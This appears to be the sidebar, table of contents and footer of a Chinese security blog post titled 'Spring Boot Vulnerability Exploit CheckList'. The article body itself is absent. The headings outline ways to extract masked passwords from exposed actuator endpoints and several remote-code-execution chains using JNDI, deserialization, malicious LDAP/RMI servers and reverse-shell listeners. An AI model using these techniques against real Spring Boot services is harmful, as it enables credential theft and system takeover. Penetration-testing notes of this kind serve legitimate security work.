	<h4> >_ 对本文进行提问：<a href="https://github.com/sentryCyberSec/sentryCyberSec.github.io/issues/new?permalink=https://github.com/sentryCyberSec/sentryCyberSec.github.io/blob//blog/2020/Spring-boot/index.html%23L84" target="_blank"> <em><li class="fa fa-github"></li> Reference in new issue.</em></a></h4>

	<h4> >_ 对本文进行留言：<a href="https://github.com/sentryCyberSec/sentryCyberSec.github.io/issues/new?permalink=《不得不谈的：「Spring Boot」未授权渗透》" target="_blank"> <em><li class="fa fa-github"></li> Leave a Comment.</em></a></h4>
	<div class="spacing"></div>
</div>
        </div><!--/col-lg-8 -->
        
        <div class="col-lg-3">
        <h4><ion-icon name="print"></ion-icon> 打印/ <ion-icon name="logo-rss"></ion-icon> 订阅</h4>
        <div class="hline"></div>
<!--     <div class="hidden-print"> -->
          <p>
            <span class="post-print">
                <a href="javascript:window.print()"><ion-icon name="print-sharp" class="fa-2x"></ion-icon></a>
                <a href="/feed.xml"><ion-icon name="logo-rss" class="fa-2x"></ion-icon></a>
            </span>
          </p>
<!--     </div> -->
    <div class="spacing"></div><br>

    <div class="hidden-print">
        <h4><ion-icon name="grid-sharp"></ion-icon> 分类目录</h4>
        <div class="hline"></div>
            
            <div class="post-meta mb-3">
            <div class="spacing"></div>
                <details>
                    <summary class="point">本文分类</summary>
                    
                    <p>
                        <i class="far fa-folder fa-fw mr-1"></i> <a href='/blog/'>blog</a></p>
                    
                    <p>
                        <i class="far fa-folder fa-fw mr-1"></i> <a href='/src/'>src</a></p>
                    
                    <p>
                        <i class="far fa-folder fa-fw mr-1"></i> <a href='/CVE/'>CVE</a></p>
                    
                    <p>
                        <i class="far fa-folder fa-fw mr-1"></i> <a href='/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/'>信息搜集</a></p>
                    
                    <p>
                        <i class="far fa-folder fa-fw mr-1"></i> <a href='/%E7%AC%94%E8%AE%B0/'>笔记</a></p>
                    
                </details>
            </div>
            
            <p>
        <details>
            <summary class="point">所有标签/数量</summary>
            
            <p>
                <i class="fa fa-angle-right"></i> Web
                <span class="badge badge-theme pull-right">11</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> 漏洞复现
                <span class="badge badge-theme pull-right">9</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> 渗透
                <span class="badge badge-theme pull-right">8</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Vulnhub
                <span class="badge badge-theme pull-right">6</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> 安全工具
                <span class="badge badge-theme pull-right">5</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> 笔记
                <span class="badge badge-theme pull-right">35</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> 软件移植
                <span class="badge badge-theme pull-right">2</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Arm
                <span class="badge badge-theme pull-right">1</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Top
                <span class="badge badge-theme pull-right">5</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> 主动防御
                <span class="badge badge-theme pull-right">2</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> 技巧
                <span class="badge badge-theme pull-right">3</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Android reverse
                <span class="badge badge-theme pull-right">4</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> 排错
                <span class="badge badge-theme pull-right">3</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Waf
                <span class="badge badge-theme pull-right">1</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Maven
                <span class="badge badge-theme pull-right">1</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Python
                <span class="badge badge-theme pull-right">1</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Terminal
                <span class="badge badge-theme pull-right">1</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Docker
                <span class="badge badge-theme pull-right">3</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Cve
                <span class="badge badge-theme pull-right">3</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> About
                <span class="badge badge-theme pull-right">21</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Sql-inject
                <span class="badge badge-theme pull-right">1</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Bash
                <span class="badge badge-theme pull-right">2</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> 内网
                <span class="badge badge-theme pull-right">1</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> 信息搜集
                <span class="badge badge-theme pull-right">6</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Fuzz
                <span class="badge badge-theme pull-right">1</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Vulnhub
                <span class="badge badge-theme pull-right">1</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Src
                <span class="badge badge-theme pull-right">1</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Daily
                <span class="badge badge-theme pull-right">3</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Cloud
                <span class="badge badge-theme pull-right">1</span>
            </p>
        
            <p>
                <i class="fa fa-angle-right"></i> Github action
                <span class="badge badge-theme pull-right">3</span>
            </p>
        
        </details>
    </div><!--class="hidden-print" stop-->

    <div class="spacing"></div>

    <h4><ion-icon name="pricetags-sharp"></ion-icon> 标签</h4>
    <div class="hline"></div>
    <p>
        
            <a class="btn btn-theme" href='/' role="button">Web (11)</a>
        
            <a class="btn btn-theme" href='/' role="button">漏洞复现 (9)</a>
        
            <a class="btn btn-theme" href='/' role="button">渗透 (8)</a>
        
            <a class="btn btn-theme" href='/' role="button">Vulnhub (6)</a>
        
            <a class="btn btn-theme" href='/' role="button">安全工具 (5)</a>
        
            <a class="btn btn-theme" href='/' role="button">笔记 (35)</a>
        
            <a class="btn btn-theme" href='/' role="button">软件移植 (2)</a>
        
            <a class="btn btn-theme" href='/' role="button">Arm (1)</a>
        
            <a class="btn btn-theme" href='/' role="button">Top (5)</a>
        
            <a class="btn btn-theme" href='/' role="button">主动防御 (2)</a>
        
            <a class="btn btn-theme" href='/' role="button">技巧 (3)</a>
        
            <a class="btn btn-theme" href='/' role="button">Android reverse (4)</a>
        
            <a class="btn btn-theme" href='/' role="button">排错 (3)</a>
        
            <a class="btn btn-theme" href='/' role="button">Waf (1)</a>
        
            <a class="btn btn-theme" href='/' role="button">Maven (1)</a>
        
            <a class="btn btn-theme" href='/' role="button">Python (1)</a>
        
            <a class="btn btn-theme" href='/' role="button">Terminal (1)</a>
        
            <a class="btn btn-theme" href='/' role="button">Docker (3)</a>
        
            <a class="btn btn-theme" href='/' role="button">Cve (3)</a>
        
            <a class="btn btn-theme" href='/' role="button">About (21)</a>
        
            <a class="btn btn-theme" href='/' role="button">Sql-inject (1)</a>
        
            <a class="btn btn-theme" href='/' role="button">Bash (2)</a>
        
            <a class="btn btn-theme" href='/' role="button">内网 (1)</a>
        
            <a class="btn btn-theme" href='/' role="button">信息搜集 (6)</a>
        
            <a class="btn btn-theme" href='/' role="button">Fuzz (1)</a>
        
            <a class="btn btn-theme" href='/' role="button">Vulnhub (1)</a>
        
            <a class="btn btn-theme" href='/' role="button">Src (1)</a>
        
            <a class="btn btn-theme" href='/' role="button">Daily (3)</a>
        
            <a class="btn btn-theme" href='/' role="button">Cloud (1)</a>
        
            <a class="btn btn-theme" href='/' role="button">Github action (3)</a>
        
    </p>
    <div class="spacing"></div>
    <div class="hidden-print">
        <h4><ion-icon name="menu-sharp"></ion-icon> 文章目录</h4>
        <div class="hline"></div>
        <p>
            <ul id="toc" class="section-nav">
<li class="toc-entry toc-h4"><a href="#spring-boot-vulnerability-exploit-checklist">Spring Boot Vulnerability Exploit CheckList</a></li>
<li class="toc-entry toc-h3"><a href="#声明">声明</a></li>
<li class="toc-entry toc-h2"><a href="#零路由和版本">零：路由和版本</a>
<ul>
<li class="toc-entry toc-h3"><a href="#0x01路由知识">0x01：路由知识</a></li>
<li class="toc-entry toc-h3"><a href="#0x02版本知识">0x02：版本知识</a>
<ul>
<li class="toc-entry toc-h4"><a href="#常见组件的版本相互依赖关系">常见组件的版本相互依赖关系：</a></li>
<li class="toc-entry toc-h4"><a href="#spring-cloud-与-spring-boot-大版本之间的依赖关系">Spring Cloud 与 Spring Boot 大版本之间的依赖关系：</a></li>
<li class="toc-entry toc-h4"><a href="#spring-cloud-小版本号的后缀及含义">Spring Cloud 小版本号的后缀及含义:</a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#一信息泄露">一：信息泄露</a>
<ul>
<li class="toc-entry toc-h3"><a href="#0x01路由地址及接口调用详情泄漏">0x01：路由地址及接口调用详情泄漏</a></li>
<li class="toc-entry toc-h3"><a href="#0x02配置不当而暴露的路由">0x02：配置不当而暴露的路由</a></li>
<li class="toc-entry toc-h3"><a href="#0x03获取被星号脱敏的密码的明文-方法一">0x03：获取被星号脱敏的密码的明文 (方法一)</a>
<ul>
<li class="toc-entry toc-h4"><a href="#利用条件">利用条件：</a></li>
<li class="toc-entry toc-h4"><a href="#利用方法">利用方法：</a>
<ul>
<li class="toc-entry toc-h5"><a href="#步骤一-找到想要获取的属性名">步骤一： 找到想要获取的属性名</a></li>
<li class="toc-entry toc-h5"><a href="#步骤二-jolokia-调用相关-mbean-获取明文">步骤二： jolokia 调用相关 Mbean 获取明文</a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#0x04获取被星号脱敏的密码的明文-方法二">0x04：获取被星号脱敏的密码的明文 (方法二)</a>
<ul>
<li class="toc-entry toc-h4"><a href="#利用条件-1">利用条件：</a></li>
<li class="toc-entry toc-h4"><a href="#利用方法-1">利用方法：</a>
<ul>
<li class="toc-entry toc-h5"><a href="#步骤一-找到想要获取的属性名-1">步骤一： 找到想要获取的属性名</a></li>
<li class="toc-entry toc-h5"><a href="#步骤二-使用-nc-监听-http-请求">步骤二： 使用 nc 监听 HTTP 请求</a></li>
<li class="toc-entry toc-h5"><a href="#步骤三-设置-eurekaclientserviceurldefaultzone-属性">步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</a></li>
<li class="toc-entry toc-h5"><a href="#步骤四-刷新配置">步骤四： 刷新配置</a></li>
<li class="toc-entry toc-h5"><a href="#步骤五-解码属性值">步骤五： 解码属性值</a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#0x05获取被星号脱敏的密码的明文-方法三">0x05：获取被星号脱敏的密码的明文 (方法三)</a>
<ul>
<li class="toc-entry toc-h4"><a href="#利用条件-2">利用条件：</a></li>
<li class="toc-entry toc-h4"><a href="#利用方法-2">利用方法：</a>
<ul>
<li class="toc-entry toc-h5"><a href="#步骤一-找到想要获取的属性名-2">步骤一： 找到想要获取的属性名</a></li>
<li class="toc-entry toc-h5"><a href="#步骤二-使用-nc-监听-http-请求-1">步骤二： 使用 nc 监听 HTTP 请求</a></li>
<li class="toc-entry toc-h5"><a href="#步骤三-触发对外-http-请求">步骤三： 触发对外 http 请求</a></li>
<li class="toc-entry toc-h5"><a href="#步骤四-刷新配置-1">步骤四： 刷新配置</a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#0x06获取被星号脱敏的密码的明文-方法四">0x06：获取被星号脱敏的密码的明文 (方法四)</a>
<ul>
<li class="toc-entry toc-h4"><a href="#利用条件-3">利用条件：</a></li>
<li class="toc-entry toc-h4"><a href="#利用方法-3">利用方法：</a>
<ul>
<li class="toc-entry toc-h5"><a href="#步骤一-找到想要获取的属性名-3">步骤一： 找到想要获取的属性名</a></li>
<li class="toc-entry toc-h5"><a href="#步骤二-下载-jvm-heap-信息">步骤二： 下载 jvm heap 信息</a></li>
<li class="toc-entry toc-h5"><a href="#步骤三-使用-mat-获得-jvm-heap-中的密码明文">步骤三： 使用 MAT 获得 jvm heap 中的密码明文</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#二远程代码执行">二：远程代码执行</a>
<ul>
<li class="toc-entry toc-h3"><a href="#0x01whitelabel-error-page-spel-rce">0x01：whitelabel error page SpEL RCE</a>
<ul>
<li class="toc-entry toc-h4"><a href="#利用条件-4">利用条件：</a></li>
<li class="toc-entry toc-h4"><a href="#利用方法-4">利用方法：</a>
<ul>
<li class="toc-entry toc-h5"><a href="#步骤一找到一个正常传参处">步骤一：找到一个正常传参处</a></li>
<li class="toc-entry toc-h5"><a href="#步骤二执行-spel-表达式">步骤二：执行 SpEL 表达式</a></li>
</ul>
</li>
<li class="toc-entry toc-h4"><a href="#漏洞原理">漏洞原理：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞分析">漏洞分析：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞环境">漏洞环境：</a></li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#0x02spring-cloud-snakeyaml-rce">0x02：spring cloud SnakeYAML RCE</a>
<ul>
<li class="toc-entry toc-h4"><a href="#利用条件-5">利用条件：</a></li>
<li class="toc-entry toc-h4"><a href="#利用方法-5">利用方法：</a>
<ul>
<li class="toc-entry toc-h5"><a href="#步骤一-托管-yml-和-jar-文件">步骤一： 托管 yml 和 jar 文件</a></li>
<li class="toc-entry toc-h5"><a href="#步骤二-设置-springcloudbootstraplocation-属性">步骤二： 设置 spring.cloud.bootstrap.location 属性</a></li>
<li class="toc-entry toc-h5"><a href="#步骤三-刷新配置">步骤三： 刷新配置</a></li>
</ul>
</li>
<li class="toc-entry toc-h4"><a href="#漏洞原理-1">漏洞原理：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞分析-1">漏洞分析：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞环境-1">漏洞环境：</a></li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#0x03eureka-xstream-deserialization-rce">0x03：eureka xstream deserialization RCE</a>
<ul>
<li class="toc-entry toc-h4"><a href="#利用条件-6">利用条件：</a></li>
<li class="toc-entry toc-h4"><a href="#利用方法-6">利用方法：</a>
<ul>
<li class="toc-entry toc-h5"><a href="#步骤一架设响应恶意-xstream-payload-的网站">步骤一：架设响应恶意 XStream payload 的网站</a></li>
<li class="toc-entry toc-h5"><a href="#步骤二监听反弹-shell-的端口">步骤二：监听反弹 shell 的端口</a></li>
<li class="toc-entry toc-h5"><a href="#步骤三设置-eurekaclientserviceurldefaultzone-属性">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</a></li>
<li class="toc-entry toc-h5"><a href="#步骤四刷新配置">步骤四：刷新配置</a></li>
</ul>
</li>
<li class="toc-entry toc-h4"><a href="#漏洞原理-2">漏洞原理：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞分析-2">漏洞分析：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞环境-2">漏洞环境：</a></li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#0x04jolokia-logback-jndi-rce">0x04：jolokia logback JNDI RCE</a>
<ul>
<li class="toc-entry toc-h4"><a href="#利用条件-7">利用条件：</a></li>
<li class="toc-entry toc-h4"><a href="#利用方法-7">利用方法：</a>
<ul>
<li class="toc-entry toc-h5"><a href="#步骤一查看已存在的-mbeans">步骤一：查看已存在的 MBeans</a></li>
<li class="toc-entry toc-h5"><a href="#步骤二托管-xml-文件">步骤二：托管 xml 文件</a></li>
<li class="toc-entry toc-h5"><a href="#步骤三准备要执行的-java-代码">步骤三：准备要执行的 Java 代码</a></li>
<li class="toc-entry toc-h5"><a href="#步骤四架设恶意-ldap-服务">步骤四：架设恶意 ldap 服务</a></li>
<li class="toc-entry toc-h5"><a href="#步骤五监听反弹-shell-的端口">步骤五：监听反弹 shell 的端口</a></li>
<li class="toc-entry toc-h5"><a href="#步骤六从外部-url-地址加载日志配置文件">步骤六：从外部 URL 地址加载日志配置文件</a></li>
</ul>
</li>
<li class="toc-entry toc-h4"><a href="#漏洞原理-3">漏洞原理：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞分析-3">漏洞分析：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞环境-3">漏洞环境：</a></li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#0x05jolokia-realm-jndi-rce">0x05：jolokia Realm JNDI RCE</a>
<ul>
<li class="toc-entry toc-h4"><a href="#利用条件-8">利用条件：</a></li>
<li class="toc-entry toc-h4"><a href="#利用方法-8">利用方法：</a>
<ul>
<li class="toc-entry toc-h5"><a href="#步骤一查看已存在的-mbeans-1">步骤一：查看已存在的 MBeans</a></li>
<li class="toc-entry toc-h5"><a href="#步骤二准备要执行的-java-代码">步骤二：准备要执行的 Java 代码</a></li>
<li class="toc-entry toc-h5"><a href="#步骤三托管-class-文件">步骤三：托管 class 文件</a></li>
<li class="toc-entry toc-h5"><a href="#步骤四架设恶意-rmi-服务">步骤四：架设恶意 rmi 服务</a></li>
<li class="toc-entry toc-h5"><a href="#步骤五监听反弹-shell-的端口-1">步骤五：监听反弹 shell 的端口</a></li>
<li class="toc-entry toc-h5"><a href="#步骤六发送恶意-payload">步骤六：发送恶意 payload</a></li>
</ul>
</li>
<li class="toc-entry toc-h4"><a href="#漏洞原理-4">漏洞原理：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞分析-4">漏洞分析：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞环境-4">漏洞环境：</a></li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#0x06h2-database-query-rce">0x06：h2 database query RCE</a>
<ul>
<li class="toc-entry toc-h4"><a href="#利用条件-9">利用条件：</a></li>
<li class="toc-entry toc-h4"><a href="#利用方法-9">利用方法：</a>
<ul>
<li class="toc-entry toc-h5"><a href="#步骤一设置-springdatasourcehikariconnection-test-query-属性">步骤一：设置 spring.datasource.hikari.connection-test-query 属性</a></li>
<li class="toc-entry toc-h5"><a href="#步骤二重启应用">步骤二：重启应用</a></li>
</ul>
</li>
<li class="toc-entry toc-h4"><a href="#漏洞原理-5">漏洞原理：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞分析-5">漏洞分析：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞环境-5">漏洞环境：</a></li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#0x07h2-database-console-jndi-rce">0x07：h2 database console JNDI RCE</a>
<ul>
<li class="toc-entry toc-h4"><a href="#利用条件-10">利用条件：</a></li>
<li class="toc-entry toc-h4"><a href="#利用方法-10">利用方法：</a>
<ul>
<li class="toc-entry toc-h5"><a href="#步骤一访问路由获得-jsessionid">步骤一：访问路由获得 jsessionid</a></li>
<li class="toc-entry toc-h5"><a href="#步骤二准备要执行的-java-代码-1">步骤二：准备要执行的 Java 代码</a></li>
<li class="toc-entry toc-h5"><a href="#步骤三托管-class-文件-1">步骤三：托管 class 文件</a></li>
<li class="toc-entry toc-h5"><a href="#步骤四架设恶意-ldap-服务-1">步骤四：架设恶意 ldap 服务</a></li>
<li class="toc-entry toc-h5"><a href="#步骤五监听反弹-shell-的端口-2">步骤五：监听反弹 shell 的端口</a></li>
<li class="toc-entry toc-h5"><a href="#步骤六发包触发-jndi-注入">步骤六：发包触发 JNDI 注入</a></li>
</ul>
</li>
<li class="toc-entry toc-h4"><a href="#漏洞分析-6">漏洞分析：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞环境-6">漏洞环境：</a></li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#0x08mysql-jdbc-deserialization-rce">0x08：mysql jdbc deserialization RCE</a>
<ul>
<li class="toc-entry toc-h4"><a href="#利用条件-11">利用条件：</a></li>
<li class="toc-entry toc-h4"><a href="#利用方法-11">利用方法：</a>
<ul>
<li class="toc-entry toc-h5"><a href="#步骤一查看环境依赖">步骤一：查看环境依赖</a></li>
<li class="toc-entry toc-h5"><a href="#步骤二架设恶意-rogue-mysql-server">步骤二：架设恶意 rogue mysql server</a></li>
<li class="toc-entry toc-h5"><a href="#步骤三设置-springdatasourceurl-属性">步骤三：设置 spring.datasource.url 属性</a></li>
<li class="toc-entry toc-h5"><a href="#步骤四刷新配置-1">步骤四：刷新配置</a></li>
<li class="toc-entry toc-h5"><a href="#步骤五触发数据库查询">步骤五：触发数据库查询</a></li>
<li class="toc-entry toc-h5"><a href="#步骤六恢复正常-jdbc-url">步骤六：恢复正常 jdbc url</a></li>
</ul>
</li>
<li class="toc-entry toc-h4"><a href="#漏洞原理-6">漏洞原理：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞分析-7">漏洞分析：</a></li>
<li class="toc-entry toc-h4"><a href="#漏洞环境-7">漏洞环境：</a></li>
</ul>
</li>
</ul>
</li>
</ul>
        </p>
    </div><!--class="hidden-print" stop-->
</div>


    </div><!--/row -->
        
</div><!--/container -->


        
<link rel="stylesheet" type="text/css" href="/assets/css/footer.css">
<div id="footerwrap" class="hidden-print">
    <div class="footer-container">
        <div class="pt3 pt3-ns pt3-m pt7-l pb0 pb0-ns pb0-m pb5-l">
            <div class="footer-row">
                <!--<div class="footer-col-lg-2">
                    <div class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l">
                        <p class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f3 f3-ns f3-m f3-l">销售
                            <button class="dn dn-ns dn-m dn-l bn bg-transparent rotate-90">
                            <svg width="16" height="16" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M19.96 58.0141L17.132 55.1861L40.318 32.0001L17.132 8.81408L19.96 5.98608L45.975 32.0001L19.96 58.0141Z" fill="#FFF"></path></svg>
                            </button>
                        </p>
                        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
                            <li class="mt1 lh-6"><a class="blue2 f2 fw4" href="/plans/enterprise/contact/">企业级销售</a></li>
                            <li class="mt1 lh-6"><a class="blue2 f2 fw4" href="/partners/">成为合作伙伴</a></li>
                            <li class=""><span class="f2 fw4 blue2">联系销售：</span></li>
                            <li class=""><a class="f2 fw4 blue2" href="tel:+18889935273">+1 (888) 99 FLARE</a></li>
                        </ul>
                    </div>
                </div>-->
                <div class="footer-col-lg-2">
                    <div class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l">
                        <p class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l">入门
                            <button class="dib dib-ns dib-m dn-l bn bg-transparent rotate-90">
                                <svg width="16" height="16" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19.96 58.0141L17.132 55.1861L40.318 32.0001L17.132 8.81408L19.96 5.98608L45.975 32.0001L19.96 58.0141Z" fill="#FFF"></path></svg>
                            </button>
                        </p>
                        <ul class="dn dn-ns dn-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/tuna/mirror-web" target="blank"><em>Jekyll Tuna</em>源码</a></li>
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://sentryCyberSec.github.io/blog/2019/jekyll/in/linux" target="blank">博客搭建教程</a></li>
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://sentryCyberSec.gitee.io/news/sentry-lab-markdown-usage/" target="blank">个性化语法批注</a></li>
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://sentryCyberSec.github.io/blog/2019/nginx/with/jekyll-site/" target="blank">公网部署</a></li>
                        </ul>
                    </div>
                </div>

                <div class="footer-col-lg-2">
                    <div class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l">
                        <p class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l">社区
                            <button class="dib dib-ns dib-m dn-l bn bg-transparent rotate-90">
                                <svg width="16" height="16" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19.96 58.0141L17.132 55.1861L40.318 32.0001L17.132 8.81408L19.96 5.98608L45.975 32.0001L19.96 58.0141Z" fill="#FFF"></path></svg>
                            </button>
                        </p>
                        <ul class="dn dn-ns dn-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="/blog" target="blank">博客</a></li>
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/sentryCyberSec/bigger-than-bigger/tree/master/CoVV" target="blank"><em>Collection of verified vulnerabilities</em></a></li>
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/sentryCyberSec/bigger-than-bigger" target="blank"><em>Bigger than Bigger</em></a></li>
                        </ul>
                    </div>
                </div>

                <div class="footer-col-lg-2">
                    <div class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l">
                        <p class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l">开发
                            <button class="dib dib-ns dib-m dn-l bn bg-transparent rotate-90">
                                <svg width="16" height="16" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19.96 58.0141L17.132 55.1861L40.318 32.0001L17.132 8.81408L19.96 5.98608L45.975 32.0001L19.96 58.0141Z" fill="#FFF"></path></svg>
                            </button>
                        </p>
                        <ul class="dn dn-ns dn-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/sentryCyberSec/Bin4xin" target="blank"><em>Bin4xin</em></a></li>
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://www.cloudflare.com/waf/" target="blank"><em>CloudFlare WAF</em></a></li>
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://jekyllrb.com/docs/" target="blank"><em>Jekyll</em></a></li>
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://www.markdownguide.org/" target="blank"><em>MarkDown</em></a></li>
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/sentryCyberSec/sentryCyberSec.github.io/actions" target="blank"><em>Github Action</em></a></li>
                        </ul>
                    </div>
                </div>

                <div class="footer-col-lg-2">
                    <div class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l">
                        <p class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l">关于
                            <button class="dib dib-ns dib-m dn-l bn bg-transparent rotate-90">
                                <svg width="16" height="16" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19.96 58.0141L17.132 55.1861L40.318 32.0001L17.132 8.81408L19.96 5.98608L45.975 32.0001L19.96 58.0141Z" fill="#FFF"></path></svg>
                            </button>
                        </p>
                        <ul class="dn dn-ns dn-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://about.sentrylab.cn/" target="blank">近期研究</a></li>
                            <li class="mt1 lh-6"><a class="white f2 fw4"><em> ∑ <csmall>(Visitors/times)</csmall></em></a></li>
                            <li class="mt1 lh-6">
                                <a class="white f2 fw4"><img src="https://profile-counter.glitch.me/sentryCyberSec.github.io/count.svg" style="max-width:100%;"></a>
                            </li>
                        </ul>
                    </div>
                </div>

                <div class="footer-col-lg-2">
                    <div class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l">
                        <p class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l">镜像
                            <button class="dib dib-ns dib-m dn-l bn bg-transparent rotate-90">
                                <svg width="16" height="16" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19.96 58.0141L17.132 55.1861L40.318 32.0001L17.132 8.81408L19.96 5.98608L45.975 32.0001L19.96 58.0141Z" fill="#FFF"></path></svg>
                            </button>
                        </p>
                        <ul class="dn dn-ns dn-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://github.com/sentryCyberSec/sentryCyberSec.github.io" target="blank">源码</a></li>
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://sentryCyberSec.gitee.io" target="blank">国内镜像/<em>CN MIRROR</em></a></li>
                            <li class="mt1 lh-6"><a class="white f2 fw4" href="https://sentryCyberSec.github.io" target="blank">国外镜像/<em>OTHER MIRROR</em></a></li>
                        </ul>
                    </div>
                </div>
            </div><!-- "/row"-->
            <div class="pv5">
                <div class="flex flex-wrap justify-start justify-start-ns justify-start-m justify-between-l footer-bottom-row-margin">
                    <div class="mb3 mb3-ns mb3-m mb0-l lh-1 mt0 mt3-ns">
                        <a class="lh-1 dib mr2" title="Facebook" target="_blank" rel="noopener" href="https://www.facebook.com/#">
                            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M16 32C24.8366 32 32 24.8366 32 16C32 7.16344 24.8366 0 16 0C7.16344 0 0 7.16344 0 16C0 24.8366 7.16344 32 16 32Z" fill="white"></path>
